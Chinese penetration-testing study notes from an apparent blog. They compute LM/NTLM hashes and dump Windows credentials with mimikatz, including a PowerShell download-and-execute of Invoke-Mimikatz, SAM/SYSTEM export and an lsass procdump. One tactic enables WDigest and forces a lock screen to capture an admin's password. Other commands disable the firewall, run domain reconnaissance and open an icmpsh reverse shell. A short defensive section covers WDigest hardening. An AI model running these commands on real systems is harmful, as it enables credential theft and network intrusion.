<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python实现LM-HASH脚本</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足14字节将会用0来补全</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 固定长度的密码被分成两个7byte部分</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再分7bit为一组末尾加0，组成新的编码</span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上步骤得到的8byte二组，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到最终LM HASH值。</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br></pre></td></tr></table></figure>

<h5 id="LM-Hash-缺点"><a href="#LM-Hash-缺点" class="headerlink" title="LM Hash 缺点"></a>LM Hash 缺点</h5><p>1.密码长度最大只能为14个字符</p>
<p>2.密码无法区分大小写</p>
<p>3.如果密码强度小于7位，那个第二个分组加密后的结果一定为 aad3b435b51404ee</p>
<p>4.Des 容易被破解 密码强度不高</p>
<br>

<p>在Windows Vista 和 Windows Server 2008 版本后 Windows默认禁用了LM Hash。LM-Hash 明文密码限制在14位以内，也就是说，如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash 通常为 aad3b435b51404eeaad3b435b51404ee</p>
<br>

<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>NT LAN Manager (NTML) Hash  是基于MD4算法。从Windows Vista/Windows Server 2003以后Windows的默认认证方式均为NTLM Hash</p>
<h5 id="NTLM-Hash生成原理"><a href="#NTLM-Hash生成原理" class="headerlink" title="NTLM Hash生成原理"></a>NTLM Hash生成原理</h5><p>1.将用户密码（转为ASCII 再）转换为十六进制</p>
<p>2.将十六进制格式的密码进行Unicode编码</p>
<p>3.使用MD4摘要算法对Unicode编码数据进行Hash计算</p>
<br>

<p>以密码123456为例 ，</p>
<ul>
<li>首先将密码字符串转换为ASCII字符串，123456 =&gt; 49 50 51 52 53 54</li>
<li>ASCII字符串在转换为十六进制，49 50 51 52 53 54 =&gt; 31 32 33 34 35 36 </li>
<li>再进行Unicode 编码， 31 32 33 34 35 36 =&gt; </li>
</ul>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><h4 id="GetPassword"><a href="#GetPassword" class="headerlink" title="GetPassword"></a>GetPassword</h4><p>直接使用管理员权限的cmd 运行 GetPassword.exe 即可</p>
<p><img src="/posts/11da9eaf/GetPassword.png"></p>
<h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><p>可以得到系统中所有庄户的NTML Hash </p>
<p><img src="/posts/11da9eaf/PwDUmp7.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>下载地址:<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>Minikatz 用于Windows下读取已经登录过的用户的Hash 和明文密码，需要admin或者system权限</p>
<h5 id="本地交互式抓取"><a href="#本地交互式抓取" class="headerlink" title="本地交互式抓取"></a>本地交互式抓取</h5><p><code>mimikatz # privilege::debug</code> 提升权限</p>
<p><code>mimikatz # log</code> 启动日志记录功能</p>
<p><code>mimikatz # sekurlsa::logonpasswords</code> 读取存储在计算机上的明文密码和Hash值</p>
<h5 id="本地非交互式抓取"><a href="#本地非交互式抓取" class="headerlink" title="本地非交互式抓取"></a>本地非交互式抓取</h5><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; mimikatz.txt</code></p>
<h4 id="powershell-加载-mimikatz抓取"><a href="#powershell-加载-mimikatz抓取" class="headerlink" title="powershell 加载 mimikatz抓取"></a>powershell 加载 mimikatz抓取</h4><p>可以连接外网情况下</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<p>内网情况下，可以搭建一个本地web服务器，使用内网ip去访问</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.0.137/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<br>

<h4 id="通过SAM-和-System-文件抓取密码"><a href="#通过SAM-和-System-文件抓取密码" class="headerlink" title="通过SAM 和 System 文件抓取密码"></a>通过SAM 和 System 文件抓取密码</h4><p>导出SAM 文件和 System 文件<br><code>reg save hklm\sam sam.hive</code><br><code>reg save hklm\system system.hive</code><br>然后将这两个文件放到mimikatz的同目录下，运行mmimikatz<br><code>lsadump::sam /sam:sam.hive /system:system.hive</code><br><img src="/posts/11da9eaf/sam_system_hash.png"><br>得到NTLM为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>在网站上进行解密<br><img src="/posts/11da9eaf/cmd5_NTLM.png"><br>得到密码为空 （该机器密码在设置时设为了空）</p>
<p>也可以使用ophcrack （<a href="https://www.objectif-securite.ch/ophcrack%EF%BC%89">https://www.objectif-securite.ch/ophcrack）</a></p>
<p><img src="/posts/11da9eaf/ophcrack.png"></p>
<p>适用场景：获得了system权限，但是无法在目标机器上上传或使用 Mimikatz，这时候就可以使用reg命令导出Sam和System文件 然后离线读取处NTML Hash 。可以考虑使用在线解密网站或者hash 传递方式得到明文。</p>
<br>

<h4 id="使用Powershell进行Dump-Hashs"><a href="#使用Powershell进行Dump-Hashs" class="headerlink" title="使用Powershell进行Dump Hashs"></a>使用Powershell进行Dump Hashs</h4><p>………………………</p>
<h4 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h4><p>ProcDump 是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为 dump 文件,是一款微软自家出品软件，所以可以过很多杀软。</p>
<h5 id="dump-lsass-exe-进程"><a href="#dump-lsass-exe-进程" class="headerlink" title="dump lsass.exe 进程"></a>dump lsass.exe 进程</h5><p>打开任务管理器 找到 lsass.exe(Local Security Authority Process) 进程，选择创建转储文件</p>
<p><img src="/posts/11da9eaf/dump_lsass.png"></p>
<p><img src="/posts/11da9eaf/dump_lsass2.png"></p>
<p>这里生成的位置在AppData\Local 下 如果没显示该文件目录 点击组织-&gt;文件夹和搜索选项-&gt;查看 将显示的隐藏文件、文件夹和驱动器前点勾</p>
<p><img src="/posts/11da9eaf/dump_lsass3.png"></p>
<p>使用procdump.exe 导出lsass.exe</p>
<p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
<h5 id="读取dump文件"><a href="#读取dump文件" class="headerlink" title="读取dump文件"></a>读取dump文件</h5><p>然后将生成的 lsass.dmp 文件放到 mimikatz 的同目录下，运行mimikatz</p>
<p>直接读取明文密码 </p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tspkg&quot; exit</code></p>
<p>读取明文密码和hash 值(显示的信息更全)</p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; exit</code></p>
<h4 id="部分系统的抓取尝试"><a href="#部分系统的抓取尝试" class="headerlink" title="部分系统的抓取尝试"></a>部分系统的抓取尝试</h4><h5 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="Windows Server 2008 R2"></a>Windows Server 2008 R2</h5><p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
<h5 id="Windows7-x64"><a href="#Windows7-x64" class="headerlink" title="Windows7 x64"></a>Windows7 x64</h5><p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
<p>这里抓取的密码为空 因为原密码为空 看下抓取的NTLM值 与 空值的相同</p>
<br>

<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>安装 KB2871997 补丁，关闭Wdigest功能(Windows Server 2012以上版本都是默认关闭的)</p>
<p>安装完该补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。</p>
<p>通过擦好看注册表键值，可以判断Wdigest功能状态，如果该值为 1 则为开启，即可获取明文密码，如果改值为0 则明文密码就不会出现在内存中。</p>
<p>开启或关闭Wdigest 的命令:</p>
<p>（1） reg add 命令</p>
<p>开启Wdigest Auth    </p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<p>关闭Wdigest Auth</p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code></p>
<p> （2）使用powershell</p>
<p>开启Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
<p>关闭Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</code></p>
<p>(3) 利用meterpreter</p>
<p>开启Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></p>
<p>关闭Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</code></p>
<br>

<p>记录一位师傅文章的思路(<a href="https://github.com/x0rz4/Intranet-information">https://github.com/x0rz4/Intranet-information</a>)</p>
<p>拿到了admin的cmd权限，管理员使用密码登录了机器，开启了lsass.exe进程，把密码保存在了内存文件lsass进程中。</p>
<p>想要的抓取明文，修改注册表开启Wdigest ，然后利用cmd的强制锁屏，等待管理员重新输入密码登录系统，这样密码就被记录在了lsass内存文件中，然后使用procdump导出lsass.dmp，使用mimikatz进行读取明文和hash</p>
<p>强制锁屏命令:</p>
<p>cmd <code>rundll32 user32.dll,LockWorkStation</code></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>
<p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p>
<p><a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习笔记</title>
    <url>/posts/11ff0b53/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h4><br>

<p><code>ipconfig /all </code>查询网络配置</p>
<h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><p><code>net user </code> 查询用户列表</p>
<p><code>net user XXX /domain</code>   查询指定用户的详细信息</p>
<p><code>net localgroup administrators</code> 查看当前用户权限</p>
<p><code>net localgroup administrators 用户名 /add </code> 添加用户到管理组  `</p>
<p><code>quser</code>  / <code>quser UserName</code>  / <code>qwinsta</code>查看当前在线用户</p>
<h4 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h4><p><code>tasklist /v</code>  查询进程列表</p>
<p><code>wmic process list brief</code> 查询进程列表</p>
<h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><p><code>systeminfo</code> </p>
<p><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code> 获取操作系统和版本信息</p>
<p><img src="/posts/11ff0b53/systeminfo.png"></p>
<p><code>wmic product get name.version</code> 查看本机安装的软件和版本信息</p>
<p><img src="/posts/11ff0b53/wmic_product.png"></p>
<p><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code>  查看本机安装的软件和版本信息</p>
<p><code>netstat -ano</code> 查看端口列表</p>
<p><code>systeminfo </code>查询补丁信息</p>
<p><code>wmic qfe get description,installedOn /format:csv</code> 查看补丁信息</p>
<p><code>net share</code> 查询本机共享</p>
<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
<p><code>netsh firewall show logging</code> 防火墙日志目录</p>
<p><code>netsh advfirewall set allprofiles state off</code>  关闭防火墙（winServer 2003以后）</p>
<hr>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><h4 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h4><p><code>ipconfig /all</code>查看信息</p>
<p><code>net time /domain</code> 判断是否存在  </p>
<blockquote>
<p>存在   返回域信息和时间 </p>
<p>存在但权限不足  发生系统错误 拒绝访问</p>
<p>不存在 找不到域Workgroup的域控制器</p>
</blockquote>
<br>

<h4 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h4><h5 id="基于ICMP"><a href="#基于ICMP" class="headerlink" title="基于ICMP"></a>基于ICMP</h5><ul>
<li>windows</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /l %i in (1,1,254) do @ping 192.168.56.%i -w 1 -n 1 | find /i &quot;ttl=&quot;</span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">%i in (1,1,254)    遍历主机位从1 ~254的所有IP </span><br><span class="line">-n    ping的次数           </span><br><span class="line">-w    等待每次回复的时长（毫秒）            </span><br><span class="line">192.168.0.%i    遍历IP 自192.168.0.1~192.168.0.254的所有IP           </span><br><span class="line">| bat    管道，将前面的结果通过管道输入给后面的命令  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/icmp_ping.png"></p>
<ul>
<li>Linux</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap ‐sP ‐PI 192.168.0.1/24 ‐T4</code></p>
<p><img src="/posts/11ff0b53/nmap_icmp.png"></p>
<br>

<h5 id="基于arp"><a href="#基于arp" class="headerlink" title="基于arp"></a>基于arp</h5><ul>
<li>arp-scan   下载地址: <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></li>
</ul>
<p>用法 <code>arp-scan.exe -t 192.168.56.0/24</code></p>
<p><img src="/posts/11ff0b53/arp-scan.png"></p>
<ul>
<li>arp</li>
</ul>
<p><code>arp -a</code></p>
<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap -sn -PR 192.168.0.1/24</code></p>
<p><img src="/posts/11ff0b53/nmap_arp.png"></p>
<ul>
<li>msf扫描</li>
</ul>
<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
<br>

<h5 id="基于udp"><a href="#基于udp" class="headerlink" title="基于udp"></a>基于udp</h5><ul>
<li>scanline</li>
</ul>
<p><code>scanline.exe 192.168.56.101</code></p>
<p><img src="/posts/11ff0b53/scanline.png"></p>
<br>

<h5 id="基于NetBIOS"><a href="#基于NetBIOS" class="headerlink" title="基于NetBIOS"></a>基于NetBIOS</h5><ul>
<li>nbtscan</li>
</ul>
<p><code>nbtscan -r 192.168.0.0/24</code></p>
<p><img src="/posts/11ff0b53/nbtscan.png"></p>
<ul>
<li>msf扫描</li>
</ul>
<p><code>use auxiliary/scanner/netbios/nbname</code><br><img src="/posts/11ff0b53/msf_netbios.png"></p>
<ul>
<li>nmap扫描</li>
</ul>
<p><code>nmap -sU --script nbstat.nse -p137 192.168.0.1/24 -T4</code></p>
<p><img src="/posts/11ff0b53/nmap_netbios.png"></p>
<br>

<h4 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h4><h5 id="利用telnet-命令进行扫描"><a href="#利用telnet-命令进行扫描" class="headerlink" title="利用telnet 命令进行扫描"></a>利用telnet 命令进行扫描</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 目标ip地址 端口号</span><br></pre></td></tr></table></figure>

<h5 id="利用msf扫描主机端口"><a href="#利用msf扫描主机端口" class="headerlink" title="利用msf扫描主机端口"></a>利用msf扫描主机端口</h5><p><code>use auxiliary/scanner/portscan/tcp</code></p>
<p><code>show options </code></p>
<p><code>set ports 1-1024 </code></p>
<p><code>set RHOSTS 192.168.56.101</code></p>
<p><code>set THREADS 10 </code></p>
<p><code>run</code></p>
<p><img src="/posts/11ff0b53/msf_portscan_tcp.png"></p>
<h4 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h4><p><code>net view /domain</code> 查看域</p>
<p><code>net view /domain:域名</code> 查看域的电脑</p>
<p><code>net group /domain</code> 查看域内用户组的列表</p>
<p><code>net group &quot;domain computers&quot; /domain </code>  查询域成员的列表</p>
<p><code>net account /domain</code></p>
<h4 id="查找域内用户和管理员"><a href="#查找域内用户和管理员" class="headerlink" title="查找域内用户和管理员"></a>查找域内用户和管理员</h4><p><code>net user /domain</code></p>
<h4 id="内网定位管理员工具"><a href="#内网定位管理员工具" class="headerlink" title="内网定位管理员工具"></a>内网定位管理员工具</h4><p>参考 <a href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
<p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p>
<ul>
<li><p>Empire  user_hunter模块</p>
</li>
<li><p>psloggedon.exe</p>
</li>
</ul>
<p><code>PsLoggedon.exe</code></p>
<ul>
<li>PVEFindADUser.exe</li>
</ul>
<p><code>PVEFindADUser.exe --current</code> 枚举出域用户以及登陆过特定系统的用户(需要管理员权限)</p>
<ul>
<li>Netsess.exe </li>
</ul>
<p>查询所有域控制器，获取所有的活跃域 </p>
<p>下载地址:<a href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>用法 <code>Netsess.exe -h</code></p>
<br>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>版本</p>
<blockquote>
<p>2.0     win2008,win7</p>
<p>3.0    win2018,win8</p>
<p>4.0    win2012R2,win8.1</p>
<p>5.0    win2016,win10</p>
</blockquote>
<p>存在4中权限</p>
<blockquote>
<p>Restricted     不允许执行任何脚本</p>
<p>Allsigned        只允许执行经过证书验证的脚本</p>
<p>Unrestricted    允许执行任何脚本</p>
<p>RemoteSigned    本地脚本不限制，对外部脚本需要经过证书验证</p>
</blockquote>
<p><code>Get-ExecutionPolicy</code>     查看PS权限</p>
<p><code>Set-ExecutionPolicy +权限</code></p>
<p>一般会用cmd 命令行  使用<code>-exec bypass</code>进行powershell绕过</p>
<h5 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h5><p>脚本地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p><code>Import-Module</code>为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1</p>
<p>格式：</p>
<p><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot;</code></p>
<p>powershell.exe -exec bypass -Command “&amp; {Import-Module C:\PowerView.ps1; Get-NetUser}”</p>
<p>PowerView命令参数</p>
<blockquote>
<p>Get-NetDomain: 获取当前用户所在域的名称<br>Get-NetUser: 获取所有用户的详细信息<br>Get-NetDomainController: 获取所有域控制器的信息<br>Get-NetComputer: 获取域内所有机器的详细信息<br>Get-NetOU: 获取域中的OU信息<br>Get-NetGroup: 获取所有域内组和组成员信息<br>Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息<br>Get-NetShare: 获取当前域内所有网络共享信息<br>Get-NetSession: 获取指定服务器的会话<br>Get-NetRDPSession: 获取指定服务器的远程连接<br>Get-NetProcess: 获取远程主机的进程<br>Get-UserEvent: 获取指定用户的日志<br>Get-ADObiect: 获取活动目录的对象<br>Get-NetGPO: 获取域内所有的组策略对象<br>Get-DomainPolicy: 获取域默认策略或域控制器策略<br>Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限<br>Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户<br>Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</p>
</blockquote>
<br>

<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHound需要使用neo4j数据库，配备java环境</p>
<p>下载地址 <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
<blockquote>
<p>URL：neo4j://localhost:7687<br>用户名(默认)：neo4j<br>密码(默认)：neo4j</p>
</blockquote>
<p>使用【待补充 】·</p>
<hr>
<h3 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h3><p>隧道: 绕过防火墙屏蔽的一种方式</p>
<br>

<p>网络层隧道：</p>
<ul>
<li>IPv6</li>
<li>ICMP</li>
</ul>
<p>传输层</p>
<ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>应用层</p>
<ul>
<li>SSH</li>
<li>HTTP</li>
<li>DNS</li>
</ul>
<br>

<h4 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断"></a>内网连通性判断</h4><ul>
<li><p>ICMP协议</p>
<p>  ping ip</p>
</li>
<li><p>TCP协议</p>
<p>  nc  -zc ip port</p>
</li>
<li><p>HTTP协议</p>
<p>  curl ip:port</p>
</li>
<li><p>DNS协议</p>
<p>  nslookup  <a href="http://www.baidu.com/">www.baidu.com</a> </p>
<p>  dig @8.8.8.8 <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
</ul>
<br>

<br>

<h4 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h4><ul>
<li>Ipv6隧道</li>
<li>ICMP隧道</li>
</ul>
<br>

<h5 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h5><p>ICMP隧道工具：icmpsh，Pingtunnel</p>
<p>icmpsh (仅适用于windows，执行icmpsh.exe不需要管理员权限)</p>
<p>Pingtunnel</p>
<br>

<h5 id="icmpsh反弹shell"><a href="#icmpsh反弹shell" class="headerlink" title="icmpsh反弹shell"></a>icmpsh反弹shell</h5><p>参考:<a href="https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ">https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ</a></p>
<p>安装 <code>git clone https://github.com/inquisb/icmpsh.git</code></p>
<p>安装依赖库<code>sudo  pip2 install impacket</code></p>
<blockquote>
<p>环境</p>
<p>kali 192.168.0.128<br>win7 192.168.0.129</p>
</blockquote>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> 关闭本地系统的icmp应答，恢复改为0即可</p>
<p>将 icmpsh.exe传到win7中，这里开启个http服务去下载<code>python3 -m http.server 9999</code></p>
<p>win7访问192.168.0.128:9999 去下载 icmpsh.exe</p>
<p>icmpsh.exe参数</p>
<blockquote>
<p>-t host         :指定攻击者IP<br>-r              :用于测试连接<br>-d milliseconds :设置请求之间的延迟(毫秒)<br>-o milliseconds :设置响应超时时间(毫秒),超时一次则计数器+1<br>-b num          :设置多少次退出<br>-s bytes        :最大数据缓冲区大小(字节)</p>
</blockquote>
<p>kali:<code>sudo python2 icmpsh_m.py  192.168.0.128[kali] 192.168.0.129[win7]</code></p>
<p>win7 <code>icmpsh.exe -t 192.168.0.128</code></p>
<p>成功反弹shell</p>
<p><img src="/posts/11ff0b53/icmpsh_shell.png"></p>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0</code>恢复原设置</p>
<br>

